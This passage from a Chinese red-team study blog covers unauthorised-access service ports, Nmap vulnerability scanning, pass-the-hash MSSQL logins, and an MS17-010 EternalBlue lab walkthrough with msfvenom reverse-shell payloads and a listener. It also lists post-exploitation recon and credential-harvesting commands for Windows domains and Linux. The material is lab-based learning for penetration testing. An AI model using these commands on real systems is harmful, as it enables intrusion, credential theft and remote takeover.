Memcached</h2><p>默认端口：11211</p><p>提示连接成功表示存在漏洞</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">telnet <span class="token operator">&lt;</span>target<span class="token operator">></span> <span class="token number">11211</span> 或 <span class="token function">nc</span> -vv <span class="token operator">&lt;</span>target<span class="token operator">></span> <span class="token number">11211</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x07-Hadoop"><a href="#0x07-Hadoop" class="headerlink" title="0x07 Hadoop"></a>0x07 Hadoop</h2><h3 id="a-HDFS"><a href="#a-HDFS" class="headerlink" title="a) HDFS"></a>a) HDFS</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">NameNode默认端口 50070DataNode默认端口 50075httpfs默认端口 14000journalnode默认端口 8480<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="b-YARN（JobTracker）"><a href="#b-YARN（JobTracker）" class="headerlink" title="b) YARN（JobTracker）"></a>b) YARN（JobTracker）</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">ResourceManager默认端口 8088JobTracker默认端口 50030TaskTracker默认端口 50060<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="c-Hue"><a href="#c-Hue" class="headerlink" title="c) Hue"></a>c) Hue</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">Hue默认端口 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="d-YARN（JobTracker）"><a href="#d-YARN（JobTracker）" class="headerlink" title="d) YARN（JobTracker）"></a>d) YARN（JobTracker）</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">master默认端口 60010regionserver默认端口 60030<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="e-hive-server2"><a href="#e-hive-server2" class="headerlink" title="e) hive-server2"></a>e) hive-server2</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">hive-server2默认端口 10000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="f-spark-jdbcserver"><a href="#f-spark-jdbcserver" class="headerlink" title="f) spark-jdbcserver"></a>f) spark-jdbcserver</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">spark-jdbcserver默认端口 10003<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x08-couchdb"><a href="#0x08-couchdb" class="headerlink" title="0x08 couchdb"></a>0x08 couchdb</h2><p>默认端口5984</p><p>couchdb的配置里将bind_address设置为0.0.0.0则存在未授权访问</p><h2 id="0x09-ldap"><a href="#0x09-ldap" class="headerlink" title="0x09 ldap"></a>0x09 ldap</h2><p>使用工具 ldap admin直接连接即可</p><h2 id="脚本合集"><a href="#脚本合集" class="headerlink" title="脚本合集"></a>脚本合集</h2><p><a href="https://github.com/f1veT/VulScan/find/master">https://github.com/f1veT/VulScan/find/master</a></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 外部打点 </tag>
            
            <tag> 未授权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见应用漏洞扫描&amp;利用</title>
      <link href="/2022/03/29/chang-jian-lou-dong-sao-miao/"/>
      <url>/2022/03/29/chang-jian-lou-dong-sao-miao/</url>
      
        <content type="html"><![CDATA[<p>本章节内容为Nmap扫描常见漏方式，mssqlclient和ms17-010脚本的使用方法。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="Nmap扫描技巧"><a href="#Nmap扫描技巧" class="headerlink" title="Nmap扫描技巧"></a>Nmap扫描技巧</h2><ul><li>auth 处理身份验证</li><li>broadcast 网络广播</li><li>brute 暴力破解</li><li>default 默认</li><li>discovery 服务发现</li><li>dos 拒绝服务</li><li>exploit 漏洞利用</li><li>external 外部扩展</li><li>fuzzer 模糊测试</li><li>intrusive 扫描可能造成不良后果</li><li>malware 检测后面</li><li>safe 扫描危害较小</li><li>version 版本识别</li><li>vuln 漏洞检测</li></ul><h3 id="通用参数-vuln"><a href="#通用参数-vuln" class="headerlink" title="通用参数 -vuln"></a>通用参数 -vuln</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap --script<span class="token operator">=</span>vuln <span class="token number">192.168</span>.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap --script<span class="token operator">=</span>smb-vuln-ms17-010 <span class="token number">192.168</span>.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/03/29/sf3yL6bT.png"></p><h2 id="impacket框架之mssql服务器安全检测"><a href="#impacket框架之mssql服务器安全检测" class="headerlink" title="impacket框架之mssql服务器安全检测"></a>impacket框架之mssql服务器安全检测</h2><p>在实际渗透测试工作中经常会遇到检测项目中mssql服务器安全性，此篇文章介绍impacket框架中mssqlclient的使用方法</p><p><a href="https://github.com/maaaaz/impacket-examples-windows">impacket for windows</a></p><h3 id="mssqlclient与其他工具相比的优势"><a href="#mssqlclient与其他工具相比的优势" class="headerlink" title="mssqlclient与其他工具相比的优势"></a>mssqlclient与其他工具相比的优势</h3><ol><li>跨平台，python脚本编写，并且已有exe版本</li><li>命令行执行，速度快</li><li>支持使用socks代理传输数据</li><li>支持以hash传递的方式进行账号验证</li><li>支持windows认证模式进行mssql服务的安全检测</li><li>支持sql命令可以是交互式，也可以直接回显sql命令执行结果</li></ol><h3 id="Mssqlclient的基本使用命令"><a href="#Mssqlclient的基本使用命令" class="headerlink" title="Mssqlclient的基本使用命令"></a>Mssqlclient的基本使用命令</h3><p>验证以windows认证模式的mssql服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python mssqlclient.py domain/username:password@ip -windows-auth<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>验证以mssql账号密码认证的mssql服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python mssqlclient.py ./username:password@ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>验证以mssql账号密码认证的mssql服务，并执行command.txt内的sql命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python mssqlclient.py ./username:password@ip -file command.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="举例分析几种实际使用情况"><a href="#举例分析几种实际使用情况" class="headerlink" title="举例分析几种实际使用情况"></a>举例分析几种实际使用情况</h4><p>1.在linux环境下使用windows认证模式，mssqlclient测试登录sqlserver服务器，如下图，账号验证通过后直接返回sql shell</p><p><img src="https://imgtp.apqiang.com/2022/03/29/hajm7yu7.png"></p><p>2.使用ntlm hash验证方式，mssqlclient测试登录sqlserver服务器，账号验证成功后返回sql shell，如下图</p><p><img src="https://imgtp.apqiang.com/2022/03/30/QJC8uvVZ.png"></p><h3 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h3><p>除此之外，还可以批量检测内网SQL server服务器的账号安全性。</p><p>需准备的文件有：</p><ul><li>mssqlclient.exe（必须）</li><li>command.txt（必须）</li></ul><p>以下四个文件需选其一</p><ul><li>hashes.txt（需验证的ntlm hash字符串列表）</li><li>username.txt（需验证的username列表）</li><li>password.txt（需验证的密码字符串列表）</li><li>Ips.txt（需验证的ip字符串列表）</li></ul><h4 id="举例批量检测的bat脚本内容"><a href="#举例批量检测的bat脚本内容" class="headerlink" title="举例批量检测的bat脚本内容"></a>举例批量检测的bat脚本内容</h4><p>测试以windows认证模式，使用明文密码验证，使用mssqlclient批量测试登录sqlserver服务器，ips.txt内容为待检测sqlserver服务器ip，每行一条</p><pre class="line-numbers language-bat" data-language="bat"><code class="language-bat">for &#x2F;f %%i in (ips.txt) do mssqlclient.exe .&#x2F;test:test@%%i -windows-auth<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在cmd中可以把 %%i 替换为 %i 直接执行</p><p>可根据此模板更换批量检测的位置</p><p><img src="https://imgtp.apqiang.com/2022/03/30/RrQrbm7Y.png"></p><h2 id="MS17-010-py-脚本利用"><a href="#MS17-010-py-脚本利用" class="headerlink" title="MS17_010.py 脚本利用"></a>MS17_010.py 脚本利用</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>为什么要介绍py脚本？因为有些机器存在漏洞，但使用MSF的模块利用失败，而使用py脚本则能成功利用</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>必要工具 <a href="https://www.python.org/downloads/release/python-266/">python2.6.6</a>、<a href="https://github.com/mhammond/pywin32/releases/download/b221/pywin32-221.win32-py2.6.exe">pywin32-221.win32-py2.6.exe</a>、<a href="https://github.com/misterch0c/shadowbroker">shadowbroker</a>（必需要严格按照版本安装才能正常运行）</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">在本地用虚拟机搭建了Kali和Windows系统<span class="token number">192.168</span>.186.8windows7 IP脚本操作机<span class="token number">192.168</span>.186.5win2003 IP靶机<span class="token number">192.168</span>.186.26kali IP用于shell回连<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在kali中用msfvenom生成64位的dll</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.186.26 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f dll <span class="token operator">></span> x64.dllmsfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.186.26 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f dll <span class="token operator">></span> x32.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在msf中配置监听模块</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole进入控制台use exploit/multi/handler//使用监听模块<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp//设置payloadshow options//查看配置信息<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.186.26//设置本地IP<span class="token builtin class-name">set</span> LPORT <span class="token number">4444</span>//设置本地端口run//运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入到shadowbroker文件夹下的windows文件夹中打开fb.py，根据提示输入参数</p><p>使用Eternalblue模块攻击</p><p><img src="https://imgtp.apqiang.com/2022/03/30/AvXzNOAs.png"></p><p><img src="https://imgtp.apqiang.com/2022/03/30/9UzdrKiP.png"></p><p><img src="https://imgtp.apqiang.com/2022/03/30/2qT8D7DC.png"></p><p>使用Doublepulsar模块回连shell到kali</p><p><img src="https://imgtp.apqiang.com/2022/03/30/ruzDyvkM.png"></p><p><img src="https://imgtp.apqiang.com/2022/03/30/bX85uHu6.png"></p><p>接下来一路回车，之后在kali上获得shell</p><p><img src="https://imgtp.apqiang.com/2022/03/30/bB4HlCyX.png"></p><p>NSA-ms17-010参考文章</p><p><a href="https://blog.csdn.net/weixin_38948797/article/details/79177880">https://blog.csdn.net/weixin_38948797/article/details/79177880</a></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 外部打点 </tag>
            
            <tag> tools </tag>
            
            <tag> 应用漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向常见端口</title>
      <link href="/2022/03/29/nei-wang-heng-xiang-chang-jian-duan-kou/"/>
      <url>/2022/03/29/nei-wang-heng-xiang-chang-jian-duan-kou/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍在内网中该一些常见的端口。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="Port：445"><a href="#Port：445" class="headerlink" title="Port：445"></a>Port：445</h2><p>SMB（Server Message Block）Windows协议族，主要功能为文件打印共享服务，简单来讲就是共享文件夹</p><p>该端口也是近年来内网横向扩展中比较火的端口，大名鼎鼎的永恒之蓝漏洞就是利用该端口，操作为扫描其是否存在MS17-010漏洞。正常情况下，其命令主要是建立IPC服务空会话</p><p><code>net use \\192.168.1.2</code></p><p>远程本地认证</p><p><code>net use \\192.168.1.2 /user:a\username password</code></p><p>注：a/username 中 a 为工作组情况下的机器命名，可以为任意字符，例如 workgroup/username</p><p>域 test.local 远程认证</p><p><code>net use \\192.168.1.2 /user:test\username password</code></p><h2 id="Port：137、138、139"><a href="#Port：137、138、139" class="headerlink" title="Port：137、138、139"></a>Port：137、138、139</h2><p>NetBios端口，137、138为UDP端口，主要用于内网传输文件，而NetBios/SMB服务器的获取主要是通过139端口的</p><h2 id="Port：135"><a href="#Port：135" class="headerlink" title="Port：135"></a>Port：135</h2><p>该端口主要使用DCOM和RPC（Remote Procedure Call）服务，我们利用这个端口主要做WMI（Windos Management Instrumentation）管理工具的远程操作</p><ul><li>使用时需要开启wmic服务</li><li>几乎所有的命令都是管理员权限</li><li>如果出现”Invalid Global Switch”，需要使用双引号把该加的地方都加上</li><li>远程系统的本地安全策略的”网络访问：本地账户的共享和安全模式”应设为”经典-本地用户以自己的身份验证”</li><li>防火墙最好是关闭状态</li></ul><p>同时，wmic还有很多版本 类似于 python版本、Powershell版本和exe版本等等</p><p>该端口还可以验证是否开启Exchange Server</p><h2 id="Port：53"><a href="#Port：53" class="headerlink" title="Port：53"></a>Port：53</h2><p>该端口为DNS服务端口，只要提供域名解析服务使用，该端口在渗透过程中可以寻找一下DNS域传送漏洞，在内网中可以使用DNS协议进行通信传输，隐蔽性更加好，参考文章：</p><ul><li>dns隧道之dns2tcp</li><li>dns隧道之dnscat2</li></ul><h2 id="Port：389"><a href="#Port：389" class="headerlink" title="Port：389"></a>Port：389</h2><p>用于LADP（轻量级目录访问协议），属于TCP/IP协议，在域过程中一般出现在域控上出现该端口，进行权限认证服务，如果拥有对该域的用户，且担心net或者其他爆破方法不可行的情况，可以尝试使用LADP端口进行爆破</p><p>工具可以使用类似于hydra等开源项目</p><h2 id="Port：88"><a href="#Port：88" class="headerlink" title="Port：88"></a>Port：88</h2><p>该端口主要开启kerberos服务，属于TCP/IP协议，主要任务是监听KDC的票据请求，该协议在渗透过程中可以进行黄金票据和白银票据的伪造，以横向扩展某些服务</p><h2 id="Port：5985"><a href="#Port：5985" class="headerlink" title="Port：5985"></a>Port：5985</h2><p>该端口主要介绍WinRM服务，WinRM是Windows对WS-Management的实现，WinRM允许远程用户使用工具和脚本对Windows服务进行管理并获取数据。并且WinRM服务自Windows Vista开始成为Windows的默认组件</p><p>条件：</p><ul><li>Windows Vista上必须手动启动，而Windows Server 2008中服务是默认开启的</li><li>服务在后台开启，但端口还没有开启监听，所以需要开启端口</li><li>使用 winrm quickconfig 对WinRM进行配置，开启HTTP和HTTPS监听，且需要开启防火墙</li></ul>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网信息搜集之wmic命令的一些使用方法</title>
      <link href="/2022/03/28/nei-wang-xin-xi-sou-ji-zhi-wmic-ming-ling-de-yi-xie-shi-yong-fang-fa/"/>
      <url>/2022/03/28/nei-wang-xin-xi-sou-ji-zhi-wmic-ming-ling-de-yi-xie-shi-yong-fang-fa/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍在内网中wmic命令。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h2><p>wmic和cmd一样在所有的windows版本中都存在，同时wmic有很多cmd下不方便使用的部分，今天给大家介绍一些在后渗透过程中非常适用的使用wmic进行信息收集的命令</p><h2 id="0x01-关于wmic"><a href="#0x01-关于wmic" class="headerlink" title="0x01.关于wmic"></a>0x01.关于wmic</h2><p>WMI命令行（WMIC）实用程序为WMI提供了命令行界面。WMIC与现有的Shell和实用程序命令兼容。在WMIC出现之前，如果要管理WMI系统，必须使用一些专门的WMI应用，例如SMS，或者使用WMI的脚本编程API，或者使用像CIM Studio之类的工具。如果不熟悉C++之类的编程语言或VBSCript之类的脚本语言，或者不掌握WMI名称空间的基本知识，要用WMI管理系统是很困难的。WMIC改变了这种情况</p><h2 id="0x02-wmic的简单使用"><a href="#0x02-wmic的简单使用" class="headerlink" title="0x02.wmic的简单使用"></a>0x02.wmic的简单使用</h2><p>首先在cmd命令行输入wmic进入交互式页面，这里说一下在powershell也可以和cmd命令行一样的操作</p><p><code>wmic /？</code> 查看WMIC命令的全局选项，WMIC全局选项可以用来设置WMIC环境的各种属性</p><p><img src="https://imgtp.apqiang.com/2022/03/28/Pfa0qYVK.png"></p><p><code>wmic process /?</code> 进程管理的帮助</p><p><img src="https://imgtp.apqiang.com/2022/03/28/uCo7Z5x3.png"></p><p><code>wmic process get /?</code> 属性获取操作帮助</p><p><img src="https://imgtp.apqiang.com/2022/03/28/nQO8OTsj.png"></p><h2 id="0x03-以进程为例展现wmic的使用"><a href="#0x03-以进程为例展现wmic的使用" class="headerlink" title="0x03.以进程为例展现wmic的使用"></a>0x03.以进程为例展现wmic的使用</h2><p>这里的靶机使用的是一台win7 x86的虚拟机 这里以查看进程为例：</p><p><code>wmic process get caption,executablepath,processid</code> 获取系统当前正在运行的进程、进程运行的路径、进程id</p><p><img src="https://imgtp.apqiang.com/2022/03/28/rNIxLrly.png"></p><p><code>wmic service where (state=&quot;running&quot;) get name,processid,pathname,startmode,caption</code> 获取系统运行的应用进程，进程名称，进程应用路径、进程id</p><p><img src="https://imgtp.apqiang.com/2022/03/28/dUB7fPTT.png"></p><p><code>wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe,productState</code> 查询杀毒软件</p><p><img src="https://imgtp.apqiang.com/2022/03/29/U69zvrpq.png"></p><p><code>wmic onboarddevice get Description,DeviceType,Enabled,Status /format:list</code> 获取主板内置信息</p><p><img src="https://imgtp.apqiang.com/2022/03/29/JVqNqWon.png"></p><p><code>wmic product get name</code> 系统安装软件情况</p><p><img src="https://imgtp.apqiang.com/2022/03/29/9O3uj4Xz.png"></p><p><code>wmic environment get Description,VariableValue</code> 系统环境变量</p><p><img src="https://imgtp.apqiang.com/2022/03/29/m5GnGk0V.png"></p><p><code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:list</code>  获取域名，主板信息，主机名，角色，用户名</p><p><img src="https://imgtp.apqiang.com/2022/03/29/Bgy0UFlt.png"></p><p><code>wmic sysdriver get caption,Name,PathName,ServiceType,State,Status /format:list</code> 获取所有进程的进程名、运行路径、服务类型、状态</p><p><img src="https://imgtp.apqiang.com/2022/03/29/ZYVGLPnS.png"></p><p>关于跟多的信息可以通过官方的说明文档</p><p><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic</a></p><h2 id="0x04-关于powershell的Get-Wmi对象"><a href="#0x04-关于powershell的Get-Wmi对象" class="headerlink" title="0x04.关于powershell的Get-Wmi对象"></a>0x04.关于powershell的Get-Wmi对象</h2><p>Get-Wmi是获取Windows Management Instrumentation（WMI）类的实例或有关可用类的信息。</p><p>我们需要首先知道自己的windows计算机支持哪些可用的WMI类</p><p><code>Get-Wmiobject -list</code> 自己的windows计算机支持哪些可用的WMI类</p><p><img src="https://imgtp.apqiang.com/2022/03/29/atPqrfIz.png"></p><p>例子：在本地计算机上获取进程</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">></span> get-wmiobject位于命令管道位置 <span class="token number">1</span> 的 cmdlet Get-WmiObject请为以下参数提供值:Class: win32_process<span class="token comment">#在本地计算机上获取进程</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/03/29/vknWQNNL.png"></p><p>Get-WmiObject和wmic相比，可以说是一个升级版，Get-WmiObject可以指定一个参数进行使用（Parameters）例如在本地计算机上获取进程，也可以指定相应的参数进行一个查询他的一个过程</p><p><code>Get-WmiObject -Class Win32_Process</code> 在本地计算机上获取进程</p><p>具体的参数以及命令在官方文档中进行查询</p><p><a href="http://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Management/Get-WmiObject?view=powershell-5.1#parameters">http://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Management/Get-WmiObject?view=powershell-5.1#parameters</a></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网信息收集</title>
      <link href="/2022/03/28/nei-wang-xin-xi-shou-ji/"/>
      <url>/2022/03/28/nei-wang-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍在内网中该如何搜集信息以及该搜集哪些信息。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="0x01-Windows（工作组和域）"><a href="#0x01-Windows（工作组和域）" class="headerlink" title="0x01 Windows（工作组和域）"></a>0x01 Windows（工作组和域）</h2><h3 id="0x01-1-检查当前shell权限"><a href="#0x01-1-检查当前shell权限" class="headerlink" title="0x01-1 检查当前shell权限"></a>0x01-1 检查当前shell权限</h3><p><code>whoami /user &amp;&amp; whoami /priv</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/4G3iqZCD.png"></p><h3 id="0x01-2-查看系统信息"><a href="#0x01-2-查看系统信息" class="headerlink" title="0x01-2 查看系统信息"></a>0x01-2 查看系统信息</h3><p><code>systeminfo</code></p><p>主机名-&gt;扮演的角色</p><p><img src="https://imgtp.apqiang.com/2022/03/28/g9zanT0N.png"></p><h3 id="0x01-3-tcp-udp-网络连接状态信息"><a href="#0x01-3-tcp-udp-网络连接状态信息" class="headerlink" title="0x01-3 tcp/udp 网络连接状态信息"></a>0x01-3 tcp/udp 网络连接状态信息</h3><p><code>netstat -ano</code></p><p>可以获取内网IP分布状态-服务（redis）</p><p><img src="https://imgtp.apqiang.com/2022/03/28/cAb597HL.png"></p><h3 id="0x01-4-机器名"><a href="#0x01-4-机器名" class="headerlink" title="0x01-4 机器名"></a>0x01-4 机器名</h3><p><code>hostname</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/NvjsJrOS.png"></p><h3 id="0x01-5-查看当前操作系统"><a href="#0x01-5-查看当前操作系统" class="headerlink" title="0x01-5 查看当前操作系统"></a>0x01-5 查看当前操作系统</h3><p><code>wmic OS get Caption,CSDVersion,OSArchitecture,Version</code></p><p><code>ver</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/ARv8kjn7.png"></p><h3 id="0x01-6-查杀软"><a href="#0x01-6-查杀软" class="headerlink" title="0x01-6 查杀软"></a>0x01-6 查杀软</h3><p><code>WMIC /Node:localhost /Namespace:\\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:list</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/5tkLRNnG.png"></p><h3 id="0x01-7-查看当前安装的程序"><a href="#0x01-7-查看当前安装的程序" class="headerlink" title="0x01-7 查看当前安装的程序"></a>0x01-7 查看当前安装的程序</h3><p><code>wmic product get name,verion</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/QmVn4TwI.png"></p><h3 id="0x01-8-查看在线用户"><a href="#0x01-8-查看在线用户" class="headerlink" title="0x01-8 查看在线用户"></a>0x01-8 查看在线用户</h3><p><code>quesr</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/JVCXP6MS.png"></p><h3 id="0x01-9-查看网络配置"><a href="#0x01-9-查看网络配置" class="headerlink" title="0x01-9 查看网络配置"></a>0x01-9 查看网络配置</h3><p>有Primary Dns Suffix就说明是域内，空的则当前机器应该在工作组</p><p><code>ipconfig /all</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/7z3QNQAe.png"></p><h3 id="0x01-10-查看进程"><a href="#0x01-10-查看进程" class="headerlink" title="0x01-10 查看进程"></a>0x01-10 查看进程</h3><p><code>tasklist /v</code></p><p>有些进程可能是域用户开启的-&gt;通过管理员权限 凭证窃取-&gt;窃取域用户的凭证</p><p><img src="https://imgtp.apqiang.com/2022/03/28/1e0FrROM.png"></p><h3 id="0x01-11查看当前登录域"><a href="#0x01-11查看当前登录域" class="headerlink" title="0x01-11查看当前登录域"></a>0x01-11查看当前登录域</h3><p><code>net config workstation</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/OquVB2qn.png"></p><h3 id="0x01-12-远程桌面连接历史记录"><a href="#0x01-12-远程桌面连接历史记录" class="headerlink" title="0x01-12 远程桌面连接历史记录"></a>0x01-12 远程桌面连接历史记录</h3><p><code>cmdkey /l</code></p><p>把凭证取下来-&gt;本地解密</p><p><img src="https://imgtp.apqiang.com/2022/03/28/3hf2Ldzj.png"></p><h3 id="0x01-13-查看本机上的用户账号列表"><a href="#0x01-13-查看本机上的用户账号列表" class="headerlink" title="0x01-13 查看本机上的用户账号列表"></a>0x01-13 查看本机上的用户账号列表</h3><p><code>net user</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/zlCdWYiF.png"></p><h3 id="0x01-14-查看本机用户XXX的信息"><a href="#0x01-14-查看本机用户XXX的信息" class="headerlink" title="0x01-14 查看本机用户XXX的信息"></a>0x01-14 查看本机用户XXX的信息</h3><p><code>net user XXX</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/TmUVLOXU.png"></p><p><code>net user /domain</code>                显示所在域的用户名单</p><p><img src="https://imgtp.apqiang.com/2022/03/28/JLDMZ2vh.png"></p><p><code>net user 域用户 /domain</code>     获取某个域用户的详细信息</p><p><img src="https://imgtp.apqiang.com/2022/03/28/GHUVuVBq.png"></p><p><code>net user /domain XXX 123456</code> 修改域用户密码，需要域管理员权限</p><p><img src="https://imgtp.apqiang.com/2022/03/28/Ac8RtURS.png"></p><p><code>net user /do</code>  获取域用户列表</p><p><img src="https://imgtp.apqiang.com/2022/03/28/m44YMg8S.png"></p><p><code>net group &quot;domain admins&quot; /domain</code>  获取域管理员列表</p><p><code>net group &quot;domain controllers&quot; /domain</code> 查看域控制器（如果有多台）</p><p><code>net group &quot;domain computers&quot; /domain</code> 查看域机器</p><p><code>net group /domain</code> 查询域里面的工作组</p><p><img src="https://imgtp.apqiang.com/2022/03/28/jy2JeBDy.png"></p><p><code>net localgroup administrators</code>  本机管理员[通常含有域用户]</p><p><code>net localgroup administrators /domain</code> 登录本机的域管理员</p><p><code>net localgroup administrators workgroup\user001 /add</code> 域用户添加到本机</p><p><img src="https://imgtp.apqiang.com/2022/03/28/zG8nxbA6.png"></p><p><img src="https://imgtp.apqiang.com/2022/03/28/DcdhGkQM.png"></p><p><code>net view</code> 查看同一域内机器列表</p><p><code>net view \\ip</code> 查看某IP共享</p><p><code>net view \\GHQ</code> 查看GHQ计算机的共享资源列表</p><p><code>net view /domain</code> 查看内网存在多少个域</p><p><code>net view /domain:XYZ</code> 查看XYZ域中的机器列表</p><p><code>net accounts /domain</code> 查询域用户密码过期等信息</p><h2 id="0x02-Windows（域）"><a href="#0x02-Windows（域）" class="headerlink" title="0x02 Windows（域）"></a>0x02 Windows（域）</h2><p><code>nltest /domain_trusts /all_trusts /v /server:192.168.1.2</code> 返回所有域信任列表</p><p><code>nltest /dsgetdc:hack /server:192.168.1.2</code> 返回域控和其相应的IP地址</p><p><img src="https://imgtp.apqiang.com/2022/03/28/1Hm3VtpJ.png"></p><h2 id="0x03-Linux"><a href="#0x03-Linux" class="headerlink" title="0x03 Linux"></a>0x03 Linux</h2><h3 id="0x03-1-查看当前权限"><a href="#0x03-1-查看当前权限" class="headerlink" title="0x03-1 查看当前权限"></a>0x03-1 查看当前权限</h3><p><code>whoami</code></p><h3 id="0x03-2-查看网卡配置"><a href="#0x03-2-查看网卡配置" class="headerlink" title="0x03-2 查看网卡配置"></a>0x03-2 查看网卡配置</h3><p><code>ifconfig</code></p><h3 id="0x03-3-查看端口状态（开启了哪些服务，内网IP连接等）"><a href="#0x03-3-查看端口状态（开启了哪些服务，内网IP连接等）" class="headerlink" title="0x03-3 查看端口状态（开启了哪些服务，内网IP连接等）"></a>0x03-3 查看端口状态（开启了哪些服务，内网IP连接等）</h3><p><code>netstat -anpt</code></p><h3 id="0x03-4-查看进程状态（开启了哪些服务等）"><a href="#0x03-4-查看进程状态（开启了哪些服务等）" class="headerlink" title="0x03-4 查看进程状态（开启了哪些服务等）"></a>0x03-4 查看进程状态（开启了哪些服务等）</h3><p><code>ps -ef</code></p><h3 id="0x03-5-查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）"><a href="#0x03-5-查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）" class="headerlink" title="0x03-5 查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）"></a>0x03-5 查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）</h3><p><code>history</code></p><p><code>cat /root/.bash_history</code></p><h3 id="0x03-6-查找某个文件（寻找配置文件等）"><a 